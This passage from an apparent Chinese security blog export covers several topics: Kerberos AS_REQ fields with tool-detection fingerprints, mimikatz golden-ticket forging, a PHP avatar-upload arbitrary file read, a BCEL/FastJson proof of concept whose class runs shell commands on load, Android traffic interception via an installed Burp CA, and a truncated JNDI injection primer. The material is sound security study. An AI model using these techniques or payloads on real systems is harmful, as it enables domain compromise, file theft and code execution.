class="number">15</span>,</span><br><span class="line">​            PK_AS_REQ_WIN = <span class="number">15</span>,</span><br><span class="line">​            PK_AS_REQ = <span class="number">16</span>,</span><br><span class="line">​            PK_AS_REP = <span class="number">17</span>,</span><br><span class="line">​            PA_PK_OCSP_RESPONSE = <span class="number">18</span>,</span><br><span class="line">​            ETYPE_INFO2 = <span class="number">19</span>,</span><br><span class="line">​            USE_SPECIFIED_KVNO = <span class="number">20</span>,</span><br><span class="line">​            SVR_REFERRAL_INFO = <span class="number">20</span>,</span><br><span class="line">​            SAM_REDIRECT = <span class="number">21</span>,</span><br><span class="line">​            GET_FROM_TYPED_DATA = <span class="number">22</span>,</span><br><span class="line">​            SAM_ETYPE_INFO = <span class="number">23</span>,</span><br><span class="line">​            SERVER_REFERRAL = <span class="number">25</span>,</span><br><span class="line">​            TD_KRB_PRINCIPAL = <span class="number">102</span>,</span><br><span class="line">​            PK_TD_TRUSTED_CERTIFIERS = <span class="number">104</span>,</span><br><span class="line">​            PK_TD_CERTIFICATE_INDEX = <span class="number">105</span>,</span><br><span class="line">​            TD_APP_DEFINED_ERROR = <span class="number">106</span>,</span><br><span class="line">​            TD_REQ_NONCE = <span class="number">107</span>,</span><br><span class="line">​            TD_REQ_SEQ = <span class="number">108</span>,</span><br><span class="line">​            PA_PAC_REQUEST = <span class="number">128</span>,</span><br><span class="line">​            S4U2SELF = <span class="number">129</span>,</span><br><span class="line">​            PA_PAC_OPTIONS = <span class="number">167</span>,</span><br><span class="line">​            PK_AS_09_BINDING = <span class="number">132</span>,</span><br><span class="line">​            CLIENT_CANONICALIZED = <span class="number">133</span></span><br></pre></td></tr></table></figure>

<p>在AS_REQ阶段主要用到的有两个</p>
<ul>
<li><p><code>ENC_TIMESTAMP</code></p>
<p>这个是<strong>预认证</strong>，就是用用户hash加密时间戳，作为value 发送给AS服务器。然后AS服务器那边有用户hash，使用用户hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过</p>
</li>
<li><p><code>PA_PAC_REQUEST</code></p>
<p>这个是启用PAC支持的扩展。PAC(Privilege Attribute Certificate)并不在原生的kerberos里面，是微软引进的扩展。详细的内容之后将有一篇文章详细介绍PAC。PAC包含在AS_REQ的响应body(AS_REP)。这里的value对应的是include&#x3D;true或者include&#x3D;false(KDC根据include的值来判断返回的票据中是否携带PAC)。</p>
</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_ovs2R1tk4p.png"></p>
<h2 id="REQ-BODY"><a href="#REQ-BODY" class="headerlink" title="REQ_BODY"></a>REQ_BODY</h2><ul>
<li>kdc-options 一些flag 字段</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  VALIDATE = <span class="number">0x00000001</span>,</span><br><span class="line">​              RENEW = <span class="number">0x00000002</span>,</span><br><span class="line">​              UNUSED29 = <span class="number">0x00000004</span>,</span><br><span class="line">​              ENCTKTINSKEY = <span class="number">0x00000008</span>,</span><br><span class="line">​              RENEWABLEOK = <span class="number">0x00000010</span>,</span><br><span class="line">​              DISABLETRANSITEDCHECK = <span class="number">0x00000020</span>,</span><br><span class="line">​              UNUSED16 = <span class="number">0x0000FFC0</span>,</span><br><span class="line">​              CANONICALIZE = <span class="number">0x00010000</span>,</span><br><span class="line">​              CNAMEINADDLTKT = <span class="number">0x00020000</span>,</span><br><span class="line">​              OK_AS_DELEGATE = <span class="number">0x00040000</span>,</span><br><span class="line">​              UNUSED12 = <span class="number">0x00080000</span>,</span><br><span class="line">​              OPTHARDWAREAUTH = <span class="number">0x00100000</span>,</span><br><span class="line">​              PREAUTHENT = <span class="number">0x00200000</span>,</span><br><span class="line">​              INITIAL = <span class="number">0x00400000</span>,</span><br><span class="line">​              RENEWABLE = <span class="number">0x00800000</span>,</span><br><span class="line">​              UNUSED7 = <span class="number">0x01000000</span>,</span><br><span class="line">​              POSTDATED = <span class="number">0x02000000</span>,</span><br><span class="line">​              ALLOWPOSTDATE = <span class="number">0x04000000</span>,</span><br><span class="line">​              PROXY = <span class="number">0x08000000</span>,</span><br><span class="line">​              PROXIABLE = <span class="number">0x10000000</span>,</span><br><span class="line">​              FORWARDED = <span class="number">0x20000000</span>,</span><br><span class="line">​              FORWARDABLE = <span class="number">0x40000000</span>,</span><br><span class="line">​              RESERVED = <span class="number">0x80000000</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>cname</p>
<p>PrincipalName 类型。PrincipalName包含type和value。</p>
<ul>
<li><p>KRB_NT_PRINCIPAL &#x3D; 1 means just the name of the principal 如dailker</p>
</li>
<li><p>KRB_NT_SRV_INST &#x3D; 2 service and other unique instance (krbtgt) 如krbtgt，cifs</p>
</li>
<li><p>KRB_NT_ENTERPRISE_PRINCIPAL &#x3D; 10 如 <a href="mailto:user@domain.com" title="user@domain.com">user@domain.com</a></p>
</li>
</ul>
<p>在AS_REQ里面cname 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。详情见<a href="/windows-protocol/kerberos/1#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98" title="相关的安全问题&gt;用户名枚举">相关的安全问题&gt;用户名枚举</a></p>
</li>
<li><p>sname</p>
<p>PrincipalName 类型</p>
<p>在AS_REQ里面sname是krbtgt，类型是KRB_NT_SRV_INST</p>
</li>
<li><p>realm</p>
<p>域名</p>
</li>
<li><p>from</p>
<p>发送时间</p>
</li>
<li><p>till</p>
<p>到期时间，rubeus和kekeo都是20370913024805Z，这个可以作为<code>特征</code>来检测工具。</p>
</li>
<li><p>nonce</p>
<p>随机生成的一个数kekeo&#x2F;mimikatz nonce是12381973，rubeus nonce是1818848256，这个也可以用来作为<code>特征</code>检测工具。</p>
</li>
<li><p>etype</p>
<p>加密类型，有</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">             des_cbc_crc = <span class="number">1</span>,</span><br><span class="line">​             des_cbc_md4 = <span class="number">2</span>,</span><br><span class="line">​             des_cbc_md5 = <span class="number">3</span>,</span><br><span class="line">​             des3_cbc_md5 = <span class="number">5</span>,</span><br><span class="line">​             des3_cbc_sha1 = <span class="number">7</span>,</span><br><span class="line">​             dsaWithSHA1_CmsOID = <span class="number">9</span>,</span><br><span class="line">​             md5WithRSAEncryption_CmsOID = <span class="number">10</span>,</span><br><span class="line">​             sha1WithRSAEncryption_CmsOID = <span class="number">11</span>,</span><br><span class="line">​             rc2CBC_EnvOID = <span class="number">12</span>,</span><br><span class="line">​             rsaEncryption_EnvOID = <span class="number">13</span>,</span><br><span class="line">​             rsaES_OAEP_ENV_OID = <span class="number">14</span>,</span><br><span class="line">​             des_ede3_cbc_Env_OID = <span class="number">15</span>,</span><br><span class="line">​             des3_cbc_sha1_kd = <span class="number">16</span>,</span><br><span class="line">​             aes128_cts_hmac_sha1 = <span class="number">17</span>,</span><br><span class="line">​             aes256_cts_hmac_sha1 = <span class="number">18</span>,</span><br><span class="line">​             rc4_hmac = <span class="number">23</span>,</span><br><span class="line">​             rc4_hmac_exp = <span class="number">24</span>,</span><br><span class="line">​             subkey_keymaterial = <span class="number">65</span></span><br></pre></td></tr></table></figure>

<p>这个地方要注意的是如果在配置里面选择用hash(不是plaintext)的话，hash的加密类型，要跟etype一样。因为KDC是按照etype类型选择用户对应加密方式的hash，如果是选择明文(plaintext)，那么client 会按照etype里面的加密方式将明文加密成hash。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_gDOZ_LL2q7.png"></p>
<h1 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h1><p>在AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的，如果我们拥有krbtgt的hash，就可以给我们自己签发任意用户的TGT票据，这个票据也被称为黄金票据。</p>
<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kerberos::golden</span><br></pre></td></tr></table></figure>

<p><code>mimikatz</code>的<code>kerberos::golden</code>模块可以用于制作黄金票据,票据格式是<code>.kirbi</code></p>
<p>首先获取krbtgt的hash</p>
<p><img src="https://p0.ssl.qhimg.com/t0103e479df6f95c9ab.png"></p>
<p>获取域的sid</p>
<p><img src="https://p5.ssl.qhimg.com/t017ed9b1c7d455c5d2.png"></p>
<p>制作黄金票据</p>
<p><img src="https://p5.ssl.qhimg.com/t01ae3c1d04ccc46dfc.png"></p>
]]></content>
      <categories>
        <category>windows认证机制</category>
      </categories>
      <tags>
        <tag>Kerberos</tag>
      </tags>
  </entry>
  <entry>
    <title>记某次代码审计</title>
    <url>/read/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>某个博客框架的最新版</p>
<span id="more"></span>

<h1 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h1><ul>
<li>于 <code>include.lib.function.base.php</code> 处发现一个<code>file_get_contents</code> 函数：</li>
</ul>
<p>   <img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Q4KCHYHMR9.png"></p>
<ul>
<li><p>回调<code>imageCropAndResize</code> 方法看<code>src_image</code> 参数是否可控</p>
<p>又于该文件夹中发现<code>resizeImage</code> 方法调用了<code>imageCropAndResize</code> 方法</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage__utB-_B7hI.png"></p>
</li>
<li><p>回调</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_AZePoqLEO8.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Q1D3dnAZpY.png"></p>
<p>由上图可见tmpFile可控</p>
</li>
<li><p>回调，得到过滤规则</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_lV8PsVFEq5.png"></p>
</li>
<li><p>回调</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_M2IXbbl6Iv.png"></p>
<p>头像上传处的功能点的tmpFile参数</p>
</li>
<li><p>回调，即可发现最开始调用的位置。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_NK059U6L02.png"></p>
</li>
</ul>
<h1 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h1><p>由以上分析可得调用链为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">admin.blogger.php</span><br><span class="line">  --&gt;uploadCropImg</span><br><span class="line">      --&gt;upload2local</span><br><span class="line">          --&gt;upload</span><br><span class="line">              --&gt;resizeImage</span><br><span class="line">                  --&gt;imageCropAndResize</span><br><span class="line">                      --&gt;include.lib.[function.base.php]</span><br></pre></td></tr></table></figure>


<ul>
<li><p>调试可知<code>tmpFile</code>参数为临时文件名</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_i6HyBtdKL5.png"></p>
<p>可以通过POST的方式上传文件，对<code>$_FILES</code>数组产生影响，进而影响tmp_name，导致任意文件读取。</p>
</li>
</ul>
<p>验证</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_QdZKgnQGsQ.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代审</tag>
      </tags>
  </entry>
  <entry>
    <title>BCEL FastJson攻击链分析</title>
    <url>/JAVA%E5%AE%89%E5%85%A8/BCEL%20FastJson%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>需要提前了解什么是<code>类加载机制</code></p>
</blockquote>
<p>认真看完了<code>ClassLoader</code>，就想着写一篇与之相关的的攻击链分析。</p>
<span id="more"></span>

<h1 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h1><p>想要了解这个攻击链，得先了解什么是<code>BCEL ClassLoader</code> 。</p>
<p><a href="https://commons.apache.org/proper/commons-bcel/" title="BCEL">BCEL</a>（<code>Apache Commons BCEL™</code>）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名<code>org.apache.bcel.util.ClassLoader</code>为<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 。</p>
<h1 id="BCEL攻击原理"><a href="#BCEL攻击原理" class="headerlink" title="BCEL攻击原理"></a>BCEL攻击原理</h1><p>截取BCEL的ClassLoader类部分代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="string">&quot;$$BCEL$$&quot;</span>.length());</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">            <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            clazz = parser.parse();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">            var8.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line">        <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(), (<span class="type">byte</span>)<span class="number">7</span>);</span><br><span class="line">        <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(), (<span class="type">byte</span>)<span class="number">1</span>);</span><br><span class="line">        name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由以上源码可以看出BCEL的类加载器在解析类名时会对ClassName中有<code>$$BCEL$$</code>标识的类做特殊处理。</p>
<p>当BCEL的<code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code>加载一个类名中带有<code>$$BCEL$$</code>的类时会截取出<code>$$BCEL$$</code>后面的字符串，然后使用<code>com.sun.org.apache.bcel.internal.classfile.Utility#decode</code>将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用<code>defineClass</code>注册解码后的类，一旦该类被加载就会触发类中的恶意代码。</p>
<h1 id="利用BCEL进行命令执行"><a href="#利用BCEL进行命令执行" class="headerlink" title="利用BCEL进行命令执行"></a>利用BCEL进行命令执行</h1><p>构造恶意类<strong>TestBCELClass</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBCELClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osName</span>  <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Windows&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="string">&quot;calc 12345678901234567&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Linux&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="string">&quot;curl localhost:9999/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在对其使用BCEL编码com.anbai.sec.classloader.TestBCELClass类字节码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bcelEncode</span><span class="params">(File classFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(FileUtils.readFileToByteArray(classFile), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有一定基础的朋友就会发现，只是注入了类名和类加载器并不足以触发类加载，导致命令执行的关键问题就在于FastJson会自动调用getter方法，<code>org.apache.commons.dbcp.BasicDataSource</code>本没有<code>connection</code>成员变量，但有一个<code>getConnection()</code>方法，按理来讲应该不会调用<code>getConnection()</code>方法，但是FastJson会通过<code>getConnection()</code>这个方法名计算出一个名为<code>connection</code>的field，因此FastJson最终还是调用了<code>getConnection()</code>方法。</p>
<p>当<code>getConnection()</code>方法被调用时就会使用注入进来的<code>org.apache.bcel.util.ClassLoader</code>类加载器加载注入进来恶意类字节码</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_DR1kCydpgI.png"></p>
<p>注意：Java将BCEL升级到6.0时用的是一个删除了ClassLoader版本的BCEL，所以这个利用链只能用来学习。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>BCEL</tag>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>APK流量转发</title>
    <url>/APP/APK%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作为一个渗透人，不仅要日WEB还得日app和小程序，由此就写了此文</p>
<span id="more"></span>

<h1 id="APK流量转发"><a href="#APK流量转发" class="headerlink" title="APK流量转发"></a>APK流量转发</h1><p>实现安卓APP全局&#x2F;单个APP的代理</p>
<p>需要的工具有：</p>
<ul>
<li>proxifier</li>
<li>clash</li>
<li>夜神模拟器</li>
</ul>
<h1 id="安装BurpSuite证书"><a href="#安装BurpSuite证书" class="headerlink" title="安装BurpSuite证书"></a>安装BurpSuite证书</h1><p>先在Proxy→Options→Add页面新建局域网代理端口：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage.png"></p>
<p>点击Import &#x2F; expoet CA certificate 选择Certificate in DER format导出CA证书并保存到某一个文件夹：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_1.png"></p>
<p>然后将CA证书上传到VPS并在该目录下用Python开启http服务：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_2.png"></p>
<p>启动夜神模拟器，打开内置游览器，</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_3.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_4.png"></p>
<p>下载证书至Download文件夹下（默认就是Download目录）：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_5.png"></p>
<p>回到本机中，打开CMD窗口，cd命令进入下载的夜神模拟器的bin目录下：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_6.png"></p>
<p>nox_adb.exe即为夜神模拟器adb模式端口，使用nox_adb.exe执行以下命令（分布执行）：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\nox_adb.exe root</span><br><span class="line">.\nox_adb.exe remount</span><br><span class="line">.\nox_adb.exe shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_7.png"></p>
<p>此时在此处输入：cd sdcard&#x2F;Download</p>
<p>执行以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /sdcard/Download/</span><br><span class="line"><span class="built_in">mv</span> CA.der <span class="number">9</span>a5ba575.<span class="number">0</span></span><br><span class="line"><span class="built_in">mv</span> <span class="number">9</span>a5ba575.<span class="number">0</span> /system/etc/security/cacerts/</span><br><span class="line">chmod <span class="number">644</span> /system/etc/security/cacerts/<span class="number">9</span>a5ba575.<span class="number">0</span></span><br></pre></td></tr></table></figure>


<p>PS：<code>此时后缀名一定要是xxx.der不是的话要重新生成证书并保存到htdocs文件夹！</code></p>
<h1 id="安装-配置Clash"><a href="#安装-配置Clash" class="headerlink" title="安装+配置Clash"></a>安装+配置Clash</h1><p>下载<a href="https://github.com/Kr328/ClashForAndroid/tags">clash</a></p>
<p>下载好之后在夜神模拟器中导入apk文件：</p>
<p>直接拖入即可</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_8.png"></p>
<p>在本机中新建一个yaml文件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mixed-port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">global</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:9090</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="comment"># http</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;http&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.106</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line">    <span class="comment"># username: username</span></span><br><span class="line">    <span class="comment"># password: password</span></span><br><span class="line">    <span class="comment"># tls: true # https</span></span><br><span class="line">    <span class="comment"># skip-cert-verify: true</span></span><br><span class="line">    <span class="comment"># sni: custom.com</span></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Proxy</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="comment"># disable-udp: true</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http</span></span><br></pre></td></tr></table></figure>


<p>192.168.0.106和后面的端口改为自己的IP和burp监听的端口</p>
<p>再把此文件拖入夜神模拟器中</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_9.png"></p>
<p>打开clash，点击配置</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_10.png"></p>
<p>点+号</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_11.png"></p>
<p>将刚刚写的yaml文件导入</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_12.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_13.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_14.png"></p>
<p>之后在启动代理</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_15.png"></p>
<p>点击代理</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_16.png"></p>
<p>选择http，按下闪电按钮</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_17.png"></p>
<p>此时就可以抓取APP全部流量包了</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_18.png"></p>
<h2 id="抓取单个APP流量包"><a href="#抓取单个APP流量包" class="headerlink" title="抓取单个APP流量包"></a>抓取单个APP流量包</h2><p>选关闭代理，再点设备</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_19.png"></p>
<p>选择网络</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_20.png"></p>
<p>单击<code>访问控制模式</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_21.png"></p>
<p>选择仅运行已选择的应用</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_22.png"></p>
<p>访问控制应用包列表</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_23.png"></p>
<p>即可抓取单个APP的流量包</p>
<p>同理，要渗透小程序时，就仅通过微信即可</p>
]]></content>
      <categories>
        <category>APP</category>
      </categories>
      <tags>
        <tag>APP渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析JNDI注入</title>
    <url>/JNID%E6%B3%A8%E5%85%A5/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考了几个师傅的文章，写了篇分析。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown79711298_p0.png"></p>
<span id="more"></span>

<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>JNDI(<code>Java Naming and Directory Interface</code>,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。</p>
<p>JNDI(<code>Java Naming and Directory Interface</code>)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。</p>
<p>JNDI可访问的现有的目录及服务有：<br>DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP&#x2F;2000&#x2F;NT&#x2F;Me&#x2F;9x的注册表、RMI、DSML v1&amp;v2、NIS。</p>
<p>以上是一段百度wiki的描述。简单点来说就相当于一个索引库，一个命名服务将对象和名称联系在了一起，并且可以通过它们指定的名称找到相应的对象。从网上文章里面查询到该作用是可以实现动态加载数据库配置文件，从而保持数据库代码不变动等。</p>
<h2 id="JNID结构"><a href="#JNID结构" class="headerlink" title="JNID结构"></a>JNID结构</h2><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</span><br><span class="line"></span><br><span class="line">javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span><br><span class="line"></span><br><span class="line">javax.naming.event：在命名目录服务器中请求事件通知；</span><br><span class="line"></span><br><span class="line">javax.naming.ldap：提供LDAP支持；</span><br><span class="line"></span><br><span class="line">javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="命名服务"><a href="#命名服务" class="headerlink" title="命名服务"></a>命名服务</h2><p>命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务</p>
<h2 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h2><p>目录服务是命名服务的拓展。它与命名服务的区别在于它可以通过对象属性来检索对象，这么说可能不太好理解，我们举个例子：比如你要在某个学校里里找某个人，那么会通过：年级-&gt;班级-&gt;姓名这种方式来查找，年级、班级、姓名这些就是某个人的属性，这种层级关系就很像目录关系，所以这种存储对象的方式就叫目录服务。</p>
<p>其实，仔细一琢磨就会感觉其实命名服务与目录服务的本质是一样的，都是通过键来查找对象，只不过目录服务的键要灵活且复杂一点。</p>
<p>这些命名&#x2F;目录服务提供者:</p>
<ul>
<li>RMI (JAVA远程方法调用)</li>
<li>LDAP (轻量级目录访问协议)</li>
<li>CORBA (公共对象请求代理体系结构)</li>
<li>DNS (域名服务)</li>
</ul>
<p>到此就可以知道了，实现JNID注入有2种方式，一种是RMI的动态类加载，一直是利用LDAP服务。</p>
<p>但在此之前还要了解两个类</p>
